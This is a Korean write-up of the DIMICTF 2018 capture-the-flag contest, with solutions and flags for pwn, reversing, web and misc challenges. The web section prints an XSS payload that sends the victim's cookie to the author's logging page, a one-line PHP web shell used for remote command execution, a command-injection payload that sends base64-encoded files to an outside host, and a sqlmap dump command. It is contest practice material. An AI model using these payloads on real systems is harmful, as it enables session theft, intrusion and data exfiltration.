<h1>DIMICTF 2018 - c2w2m2 (12180P, 1th)</h1>
<p><img src="1th.PNG" alt="1th.PNG"></p>
<h2>List</h2>
<ul>
<li>Pwn
<ul>
<li>init</li>
<li>treefrog</li>
<li>babycpp</li>
<li>what</li>
</ul>
</li>
<li>Rev
<ul>
<li>EZPZ</li>
<li>mm</li>
</ul>
</li>
<li>Web
<ul>
<li>DIMI SIMPLE BOARD1</li>
<li>DIMI SIMPLE BOARD2</li>
<li>Boxipreter</li>
<li>easy curl</li>
<li>easy login</li>
</ul>
</li>
<li>Misc
<ul>
<li>Mic Check</li>
<li>Number Baseball</li>
<li>Win RSP</li>
<li>guess</li>
</ul>
</li>
</ul>
<h2>Pwn</h2>
<h3>init</h3>
<p>처음 input으로 첫바이트를 \x00 으로 바꿔서 주소를 좀 앞으로 옮기고
100byte정도 읽어주면 플래그가 끼어 나온다</p>
<p><a href="./pwn/init.py">exp.py</a></p>
<p><img src="./pwn/init.png" alt="쉘딴 이미지"></p>
<p><strong>Flag</strong> : dimi{A110cAt3_1s_$o_1mp0rt@n7}</p>
<h3>treefrog</h3>
<p>바로 bof를 준다. payload를 뒤집는데, 이는 처음에 \x00을 넣어, strlen을 0 으로 만듬으로써 우회할 수 있다.</p>
<p><a href="http://tech.c2w2m2.com/pwn/return-to-csu/">return to csu</a> 로 풀었다.</p>
<p><a href="./pwn/treefrog.py">exp.py</a></p>
<p><img src="./pwn/treefrog.png" alt="쉘딴 이미지"></p>
<p><strong>Flag</strong> : dimi{R1bb!t_r1bb!t_fr0g_1s_$in9!ng_@_s0ng}</p>
<h3>babycpp</h3>
<p>cpp라서 처음에 조금 당황했는데, 어렵지 않았다.</p>
<p>단순히 UAF가 터지고, Vuln생성시 함수 포인터가 같이 생기며, Shell을 생성시 shell을 얻을 수 있는 함수의 주소를 넣어주니까</p>
<ol>
<li>Vuln  생성</li>
<li>Vuln  삭제</li>
<li>Shell 생성 =&gt; Vuln의 함수 포인터 조작</li>
<li>Vuln  호출</li>
</ol>
<p>하면 풀리게 된다.</p>
<p><img src="./pwn/babycpp.png" alt="쉘딴 이미지"></p>
<p><strong>Flag</strong> : dimi{Cpp_1s_e@5y_and_d1ff1cult}</p>
<h3>what</h3>
<p>integer overflow를 이용하는 oob 문제이다. 크게 어렵지 않았다.</p>
<p>Payload : ./what -2147483632 sh</p>
<p><img src="./pwn/what.png" alt="쉘딴 이미지"></p>
<p><strong>Flag</strong> : dimi{oo00OO0O0oOO00O0O00Oo0Ob}</p>
<h2>Rev</h2>
<h3>ezpz</h3>
<p>.NET으로 만들어졌다. dotpeek로 열어서 확인해보면</p>
<pre><code>private void button1_Click(object sender, EventArgs e)
    {
      if (string.Compare(this.INPUT.Text, &quot;Welcome_reversing&quot;) != 0)
        return;
      int num = (int) MessageBox.Show(&quot;dimi{&quot; + this.INPUT.Text + &quot;}&quot;);
    }
</code></pre>
<p>다음과 같은 코드가 있다.</p>
<p><strong>Flag</strong> : dimi{Welcome_reversing}</p>
<h3>mm</h3>
<pre><code>srand(0x17A3u); 
</code></pre>
<p>같은 시드로 srand 를 하고</p>
<pre><code>v4 = strlen(a1);
memset(s1, 0, 0x200uLL);
for ( i = 0; i &lt; v4; ++i )
{
    v1 = (unsigned __int16)rand();
    s1[i] = v1 * a1[i] % (v1 + 1);
}
return memcmp(s1, &amp;unk_201020, 0x74uLL) == 0;
</code></pre>
<p>다음과 같은 연산으로 테이블과 맞는지 확인한다.</p>
<p>그래서 unk_201020테이블을 꺼내와서 역연산을 진행 해주면 되는데, 내가 멍청해서 역연산을 짜려다가 답없어서 for로 다 넣어봤다.</p>
<p><a href="./rev/mm.py">solver.py</a></p>
<p><strong>Flag</strong> : dimi{ca1cul4t3d_inv3rs3?_0r_us3d_z3?<em>0h_y0u_ar3_4_F0Ol</em>;)}</p>
<h2>Web</h2>
<h3>DIMI SIMPLE BOARD1</h3>
<p>글을 읽는 idx에서 union based sqli가 가능해서, 이걸로 비밀글을 읽으면 된다.</p>
<p>sqlmap 돌렸다.</p>
<pre><code>sqlmap -u &quot;http://URL/read.php?idx=1&quot; --threads=10 --random-agent  --dbs -D board --tables --dump 
</code></pre>
<p><img src="./web/BOARD1.png" alt="board1"></p>
<p><strong>Flag</strong> : dimi{dimi_qna_sqlinjection}</p>
<p><s>dimigo{} 라 써있는데 dimi다</s></p>
<h3>DIMI SIMPLE BOARD2</h3>
<p>XSS도 터지길래 열심히 세션 훔쳐다가 일일히 대입하다 보니까 갑자기 메인페이지에 플래그가 나왔다.</p>
<p>서버쪽 코드</p>
<pre><code>&lt;?php
    file_put_contents(&quot;./admin_log&quot;, $_GET['cookie']);
?&gt;

tail -f admin_log
</code></pre>
<p>XSS 코드</p>
<pre><code>&lt;script&gt;
    window.open(&quot;http://URL/q.php?cookie=&quot; + document.cookie);
    location.href=&quot;http://URL/q.php?cookie=&quot; + document.cookie;
&lt;/script&gt;
</code></pre>
<p>봇이 뭐가 터질지 몰라서 두개다 준비해봤다.</p>
<p><strong>Flag</strong> : ~~~</p>
<h3>Boxipreter</h3>
<p>unintened solution인거 같다.</p>
<pre><code>&lt;?php
    $a = $_GET['a'];
    $b = $_GET['b'];
    $a($b);
?&gt;
</code></pre>
<p>하나 올리고</p>
<p>http://URL/asdf.php?a=system&amp;b=ls</p>
<p>꼴로 RCE 해주면 된다.</p>
<p><strong>Flag</strong> : dimi{B0x1Pr3teR_1s_ver7_@wesome_!1!}</p>
<h3>easy curl</h3>
<p>$ 랑 () 가 안막혀서 command injection이 된다.</p>
<p>SSRF 인줄 알고 개고생했었다...</p>
<p>띄어쓰기는 $IFS인가로 우회하면 된다.</p>
<p>Payload : http://url.com/?url=q1a.oa.to/$(base64$IFS-w0$IFS./f*)</p>
<p>글자길이 줄이려고 내 IP q1a.oa.to 로 연결시켰고, \n 우회하려고 base64 -w0 을 사용했다.</p>
<p><strong>Flag</strong> : dimi{umm~,<em>y0u_ar3_good_at_c0mm4nd_inj3ct1on</em>;)}</p>
<h3>easy login</h3>
<p>힌트로 나온 guest보고 풀었다.</p>
<p>처음 로그인 guest/guest로 로그인하고, cookie를 admin으로 바꾸면 admin.php 로 가라는데
여기서 나오는 input은 strcmp인지 == 인지 모르겠지만 Array를 사용해서 우회가 가능하다.</p>
<p><strong>Flag</strong> : dimi{umm,easy_login~}</p>
<h2>Misc</h2>
<h3>MIC check</h3>
<p>그냥 MIC check</p>
<p><strong>Flag</strong> : dimi{Hello, DIMIGO!}</p>
<h3>Number Baseball</h3>
<p>인터넷 찾아보니까 <a href="https://github.com/vpavlenko/bulls-and-cows">solver.py</a>가 있었다.</p>
<p><a href="./misc/baseball.py">solver.py</a></p>
<p>가끔 안되는 경우 있어서 조금 더 해주면 된다</p>
<p><img src="./misc/base.png" alt="base"></p>
<p><strong>Flag</strong> : dimi{Do you know? Numerical baseball is called a bull-cow game in foreign countries.}</p>
<h3>Win RSP</h3>
<p>apk 까면 Blowfish.java에</p>
<pre><code>public static String decrypt(String string) throws Exception {
        SecretKeySpec keySpec = new SecretKeySpec(&quot;6b65797b746869735f69735f6e6f745f666c61675f6f6b61793f3f7d&quot;.getBytes(), &quot;Blowfish&quot;);
        Cipher cipher = Cipher.getInstance(&quot;Blowfish/CFB/PKCS5Padding&quot;);
        byte[] ciphertext = Base64.decode(string, 0);
        cipher.init(2, keySpec, new IvParameterSpec(&quot;01234567&quot;.getBytes()));
        byte[] message = cipher.doFinal(ciphertext);
        System.out.println(&quot;-- Decrypted -----------&quot;);
        System.out.println(&quot;HEX:\t &quot; + bytesToHex(message));
        System.out.println(&quot;PLAIN:\t &quot; + new String(message));
        return new String(message);
    }
</code></pre>
<p>있는데 걍 디코드 하면 된다.</p>
<p><a href="./misc/rsp.java">solver.java</a></p>
<p><strong>Flag</strong>: flag{Are_you_Genius_or_Stupid?}</p>
<h3>guess</h3>
<p>이거 그냥 안에 있는거 imgur에 가져다 박으면 덴다</p>
<p>https://imgur.com/8Xk4HCc</p>
<p><strong>Flag</strong> : dimi{w0w_y0u_ar3_sup3rdip4_gu3ss3r~}</p>
